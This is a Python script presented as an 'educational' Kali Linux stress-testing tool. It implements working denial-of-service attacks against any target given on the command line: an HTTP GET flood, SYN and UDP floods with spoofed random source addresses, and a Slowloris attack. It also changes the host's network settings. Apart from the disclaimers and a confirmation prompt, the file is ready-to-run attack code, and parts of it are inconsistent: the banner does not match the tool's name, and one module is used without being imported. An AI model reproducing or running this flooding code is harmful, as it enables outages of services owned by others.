#!/usr/bin/env python3
"""
DDoSify - Kali Linux Network Stress Testing Tool
Educational DDoS simulation for security testing
Optimized for Kali Linux penetration testing
Author: Security Research
"""

import argparse
import threading
import time
import socket
import random
import sys
import os
import signal
import requests
from scapy.all import *
import concurrent.futures
from urllib.parse import urlparse

# Global variables for control
running = False
stats = {
    'packets_sent': 0,
    'connections_made': 0,
    'start_time': None,
    'threads_active': 0
}

class DDoSify:
    def __init__(self):
        self.running = False
        self.threads = []
        
    def http_flood(self, target, port, threads, duration):
        """HTTP GET flood attack"""
        global stats
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            while self.running:
                try:
                    # Create HTTP request
                    url = f"http://{target}:{port}/"
                    headers = {
                        'User-Agent': random.choice([
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                        ]),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Connection': 'keep-alive',
                    }
                    
                    # Send request
                    response = requests.get(url, headers=headers, timeout=5)
                    stats['packets_sent'] += 1
                    
                except:
                    stats['packets_sent'] += 1  # Count failed attempts too
                
                time.sleep(0.01)  # Small delay to prevent overwhelming
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def syn_flood(self, target, port, threads, duration):
        """SYN flood attack using raw sockets"""
        global stats
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            while self.running:
                try:
                    # Create SYN packet
                    ip_layer = IP(src=RandIP(), dst=target)
                    tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
                    packet = ip_layer / tcp_layer
                    
                    # Send packet
                    send(packet, verbose=False)
                    stats['packets_sent'] += 1
                    
                except:
                    pass
                
                time.sleep(0.001)  # Very small delay
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def udp_flood(self, target, port, threads, duration):
        """UDP flood attack"""
        global stats
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            while self.running:
                try:
                    # Create UDP packet
                    ip_layer = IP(src=RandIP(), dst=target)
                    udp_layer = UDP(sport=RandShort(), dport=port)
                    payload = random.randbytes(random.randint(1, 1024))
                    packet = ip_layer / udp_layer / payload
                    
                    # Send packet
                    send(packet, verbose=False)
                    stats['packets_sent'] += 1
                    
                except:
                    pass
                
                time.sleep(0.001)
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def slowloris(self, target, port, threads, duration):
        """Slowloris attack - slow HTTP headers"""
        global stats
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            while self.running:
                try:
                    # Create socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((target, port))
                    
                    # Send partial HTTP header
                    sock.send(b"GET /" + str(random.randint(1, 1000)).encode() + b" HTTP/1.1\r\n")
                    sock.send(b"Host: " + target.encode() + b"\r\n")
                    sock.send(b"User-Agent: " + random.choice([
                        b"Mozilla/5.0", b"Chrome/91.0", b"Firefox/89.0"
                    ]) + b"\r\n")
                    
                    # Keep connection alive with slow headers
                    for _ in range(50):
                        if not self.running:
                            break
                        sock.send(b"X-" + random.randbytes(10).hex().encode() + b": a\r\n")
                        stats['packets_sent'] += 1
                        time.sleep(5)
                    
                    sock.close()
                    stats['connections_made'] += 1
                    
                except:
                    pass
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def start_attack(self, method, target, port, threads, duration):
        """Start the specified attack"""
        global running, stats
        
        if not self.validate_target(target, port):
            return False
        
        # Reset stats
        stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'start_time': time.time(),
            'threads_active': 0
        }
        
        self.running = True
        running = True
        
        print(f"[*] Starting {method.upper()} attack on {target}:{port}")
        print(f"[*] Threads: {threads} | Duration: {duration}s")
        print(f"[*] Press Ctrl+C to stop attack")
        print("-" * 60)
        
        # Start attack method
        if method == "http":
            self.http_flood(target, port, threads, duration)
        elif method == "syn":
            self.syn_flood(target, port, threads, duration)
        elif method == "udp":
            self.udp_flood(target, port, threads, duration)
        elif method == "slowloris":
            self.slowloris(target, port, threads, duration)
        else:
            print(f"[-] Unknown attack method: {method}")
            return False
        
        # Monitor attack
        self.monitor_attack(duration)
        
        return True
    
    def monitor_attack(self, duration):
        """Monitor attack statistics"""
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            rate = stats['packets_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\r[+] Packets: {stats['packets_sent']:,} | "
                  f"Rate: {rate:.2f}/s | "
                  f"Threads: {stats['threads_active']} | "
                  f"Time: {elapsed:.1f}s", end="")
            
            time.sleep(1)
        
        self.stop_attack()
    
    def stop_attack(self):
        """Stop the attack"""
        global running
        
        self.running = False
        running = False
        
        print("\n" + "-" * 60)
        print("[*] Attack stopped")
        
        if stats['start_time']:
            elapsed = time.time() - stats['start_time']
            rate = stats['packets_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"[+] Total packets sent: {stats['packets_sent']:,}")
            print(f"[+] Total connections: {stats['connections_made']:,}")
            print(f"[+] Average rate: {rate:.2f} packets/second")
            print(f"[+] Duration: {elapsed:.2f} seconds")
    
    def validate_target(self, target, port):
        """Validate target and port"""
        try:
            # Validate IP/hostname
            socket.gethostbyname(target)
            
            # Validate port
            if not (1 <= port <= 65535):
                print("[-] Port must be between 1 and 65535")
                return False
            
            return True
            
        except socket.gaierror:
            print(f"[-] Invalid target: {target}")
            return False
    
    def test_connection(self, target, port):
        """Test if target is reachable"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, port))
            sock.close()
            
            if result == 0:
                print(f"[+] Target {target}:{port} is reachable")
                return True
            else:
                print(f"[-] Target {target}:{port} is not reachable")
                return False
                
        except Exception as e:
            print(f"[-] Error testing connection: {e}")
            return False

def signal_handler(sig, frame):
    """Handle Ctrl+C signal"""
    global running
    print("\n[!] Attack interrupted by user")
    running = False

def print_banner():
    """Print DDoSify banner with Kali Linux branding"""
    banner = """
    ____            __  __       _ _           
   |  _ \ ___  _ __|  \/  |_   _| | | ___  _ __ 
   | |_) / _ \| '__| |\/| | | | | | |/ _ \| '__|
   |  __/ (_) | |  | |  | | |_| | | | (_) | |   
   |_|   \___/|_|  |_|  |_|\__,_|_|_|\___/|_|   
                                               
    Kali Linux Network Stress Testing Tool
    Educational Purpose Only - Penetration Testing
    Author: Security Research
    
    [!] Optimized for Kali Linux
    [!] Educational Testing Only
    [!] Use Only on Authorized Networks
    """
    print(banner)

def check_kali_environment():
    """Check if running on Kali Linux and optimize"""
    try:
        # Check for Kali Linux
        with open('/etc/os-release', 'r') as f:
            os_info = f.read().lower()
            if 'kali' in os_info:
                print("[+] Kali Linux detected - Optimizing for pentesting...")
                return optimize_for_kali()
            else:
                print("[!] Not running on Kali Linux - Some features may be limited")
                return False
    except:
        print("[!] Could not detect operating system")
        return False

def optimize_for_kali():
    """Optimize settings for Kali Linux"""
    try:
        # Check for root privileges
        if os.geteuid() == 0:
            print("[+] Running as root - Full attack capabilities available")
            
            # Optimize network settings for Kali
            optimize_network_settings()
            return True
        else:
            print("[-] Not running as root - Limited attack capabilities")
            print("[!] Run with sudo for full functionality: sudo python3 ddosify.py")
            return False
    except Exception as e:
        print(f"[-] Optimization error: {e}")
        return False

def optimize_network_settings():
    """Optimize network settings for DDoS testing"""
    try:
        # Increase socket limits
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))
        
        # Disable ICMP rate limiting (Kali specific)
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.icmp_ratelimit=0'], 
                         capture_output=True, check=True)
            print("[+] ICMP rate limiting disabled")
        except:
            pass
        
        # Optimize TCP settings
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.tcp_syncookies=0'], 
                         capture_output=True, check=True)
            print("[+] TCP syncookies disabled for testing")
        except:
            pass
            
        print("[+] Network settings optimized for DDoS testing")
        
    except Exception as e:
        print(f"[-] Network optimization failed: {e}")

def get_kali_tools():
    """Check for Kali pentesting tools integration"""
    kali_tools = {
        'nmap': False,
        'hping3': False,
        'netcat': False,
        'tcpdump': False
    }
    
    for tool in kali_tools:
        try:
            subprocess.run(['which', tool], capture_output=True, check=True)
            kali_tools[tool] = True
        except:
            pass
    
    available_tools = [tool for tool, available in kali_tools.items() if available]
    
    if available_tools:
        print(f"[+] Found Kali tools: {', '.join(available_tools)}")
        return available_tools
    else:
        print("[-] No common Kali tools found")
        return []

def main():
    parser = argparse.ArgumentParser(
        description="DDoSify - Kali Linux Network Stress Testing Tool",
        epilog="Example: sudo python3 ddosify.py -m http -t 192.168.1.100 -p 80 --threads 100 --duration 30"
    )
    
    parser.add_argument("-m", "--method", required=True, 
                       choices=["http", "syn", "udp", "slowloris"],
                       help="Attack method")
    parser.add_argument("-t", "--target", required=True,
                       help="Target IP or hostname")
    parser.add_argument("-p", "--port", type=int, default=80,
                       help="Target port (default: 80)")
    parser.add_argument("--threads", type=int, default=50,
                       help="Number of threads (default: 50)")
    parser.add_argument("--duration", type=int, default=60,
                       help="Attack duration in seconds (default: 60)")
    parser.add_argument("--test", action="store_true",
                       help="Test connection before attacking")
    parser.add_argument("--kali-optimize", action="store_true", default=True,
                       help="Optimize for Kali Linux (default)")
    parser.add_argument("--check-tools", action="store_true",
                       help="Check for available Kali pentesting tools")
    
    args = parser.parse_args()
    
    # Print banner and check Kali environment
    print_banner()
    print("=" * 60)
    
    # Kali Linux optimizations
    kali_optimized = False
    if args.kali_optimize:
        kali_optimized = check_kali_environment()
    
    # Check for Kali tools if requested
    if args.check_tools:
        get_kali_tools()
    
    # Safety warnings
    print("WARNING: This tool is for educational purposes only!")
    print("Only use on networks you own or have explicit permission to test.")
    print("Unauthorized use is illegal and may result in prosecution.")
    if kali_optimized:
        print("[!] Running with Kali Linux optimizations")
    print("=" * 60)
    
    # Confirm attack
    try:
        confirm = input("Do you understand and accept responsibility? (yes/no): ")
        if confirm.lower() != 'yes':
            print("Attack cancelled.")
            return
    except KeyboardInterrupt:
        print("\nAttack cancelled.")
        return
    
    # Check for root privileges (required for raw sockets)
    if args.method in ["syn", "udp"] and os.geteuid() != 0:
        print("[-] SYN/UDP attacks require root privileges. Run with sudo.")
        print("[!] Kali Linux command: sudo python3 ddosify.py")
        sys.exit(1)
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create DDoSify instance
    ddos = DDoSify()
    
    # Test connection if requested
    if args.test:
        if not ddos.test_connection(args.target, args.port):
            return
    
    # Start attack
    try:
        ddos.start_attack(
            method=args.method,
            target=args.target,
            port=args.port,
            threads=args.threads,
            duration=args.duration
        )
    except KeyboardInterrupt:
        ddos.stop_attack()
    except Exception as e:
        print(f"[-] Error: {e}")
        ddos.stop_attack()

if __name__ == "__main__":
    main()
